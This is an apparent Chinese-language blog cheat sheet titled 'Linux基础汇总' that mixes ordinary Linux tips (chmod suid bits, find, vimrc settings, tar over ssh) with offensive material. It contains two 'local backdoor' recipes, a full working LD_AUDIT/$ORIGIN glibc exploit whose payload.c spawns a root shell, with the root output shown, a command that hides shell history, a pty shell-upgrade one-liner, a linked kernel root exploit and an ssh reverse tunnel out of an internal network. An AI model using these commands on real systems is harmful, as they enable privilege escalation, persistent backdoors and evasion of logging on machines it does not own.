---
layout: post
title: "Linux基础汇总"
---

## Linux基础汇总


* suid/guid

	suid意味着如果A用户对属于他自己的shell脚本文件设置了这种权限，那么其他用户在执行这个脚本的时候就拥有了A用户的权限。所以，如果 root用户对某一脚本设置了这一权限的话则其他用户执行该脚本的时候则拥有了root用户权限。同理，guid意味着执行相应脚本的用户则拥有了该文件所属用户组中用户的权限。

	给文件加suid和sgid的命令如下：

	    chmod u+s filename 设置suid位
	    chmod u-s filename 去掉suid设置
	    chmod g+s filename 设置sgid位
	    chmod g-s filename 去掉sgid设置

* find / -type f -perm /u+s -ls

	-perm #按执行权限来查找  
	-type b/d/c/p/l/f #查是块设备、目录、字符设备、管道、符号链接、普通文件
	
* find ./ -name ‘*.java’ -exec grep -i “ABCD” {} \; -print 在当前路径不区分大小写查找所有*.java的文件里面含有”ABCD”的内容行，并且print出来文件的路径

* find /web/htdocs -type f -name "*.php" |xargs grep "eval(" > /tmp/test.txt

* Linux kernel 2.6 < 2.6.19 (32bit) ip_append_data() local ring0 root exploit

	[http://www.lengmo.net/post/1380]

* 本地后门2法 xi4oyu

	1.
	
	    cd /lib
	    chmod +s ld-linux.so.2
	    /lib/ld-linux.so.2 `which whoami`

	2.
	
	    chmod a+w /etc/fstab
	    echo 'test /mnt ext2 user,suid,exec,loop 0 0' >> /etc/fstab
	    chown root.root setuid
	    chmod u+s setuid
	    mount test
	    cd /mnt

* ssh的history处理 & 日至相关

	    export HISTFILE=/dev/null

	ssh日志默认保存在 /var/log/secure文件里
	
* python -c 'import pty; pty.spawn("/bin/sh")'

* 基础操作

	增加一个用户  
	useradd application  
	passwd // 根据提示设置密码
	
* exp

	    $ mkdir /tmp/exploit
	    $ ln /bin/ping /tmp/exploit/target
	    $ exec 3< /tmp/exploit/target
	    $ ls -l /proc/$$/fd/3
	    $ rm -rf /tmp/exploit/
	    $ cat > payload.c
	    void __attribute__((constructor)) init()
	    {
	        setuid(0);
	        system("/bin/bash");
	    }
	    ^D
	    $ gcc -w -fPIC -shared -o /tmp/exploit payload.c
	    $ ls -l /tmp/exploit
	    $ LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
	    sh-4.1# whoami
	    root
	    sh-4.1# id
	    uid=0(root) gid=500(taviso)

* 自己建立ipkg feed服务器

	[http://www.oesf.org/index.php?title=Setting_Up_A_Feed ipkg-make-index.sh]
	
	[http://buffalo.nas-central.org/wiki/Construct_ipkg_packages_(for_developers)]
	
	gzip -9c Packages > Packages.gz


* 连接godaddy的ftp需要用passive模式。ftp之后，运行passive

* C库（glibc）  

	glibc是个C库，几乎所有的应用程序都需要共享它提供的功能（除了kernel、bootload、和其它完全不用C库的功能代码），因此glibc的存在有利益小系统或嵌入系统缩减系统总代码尺寸与存放空间（尽管单个的glibc库是比较大的）。所以，最后的工作就是：构造ARM交叉编译系统的glibc库。

* 安装语言包  
	sudo apt-get install language-support-zh

* .vimrc编写指南  
	set nocp #该命令指定让 VIM 工作在不兼容模式下  
	set ru #该命令打开 VIM 的状态栏标尺。  
	set hls #搜索时高亮显示被找到的文本。  
	syntax on #打开关键字上色。  
	set backspace=indent,eol,start #字母删除问题  
	set whichwrap=b,s,<,>,[,] #光标跳转  

* linux下使用tar和ssh压缩传输文件

	    ssh username@remoteip "cd /some/path/; tar czf - path" | tar xvzf -#压缩传输
	    tar cvzf - /path/ | ssh username@remoteip "cd /some/path/; tar xvzf -" #压缩传输一个目录并解压

* ssh sock

	    ssh username@my_host_ip_address -D 7070
	    ssh -N -L 5555:202.202.202.1:22 admin@101.101.101.1
	    ssh -N -D 7070 user@localhost -p 555
	>内网运行：ssh -f -N -R 10000:localhost:22 username@反连的外网ip也就是说，在主控端10000端口和被控端的22端口上建立了一个通道。-R [listen-IP:]listen-port:host:portForward remote port to local address外网ip运行：ssh username@localhost -p 10000

* 未完待续






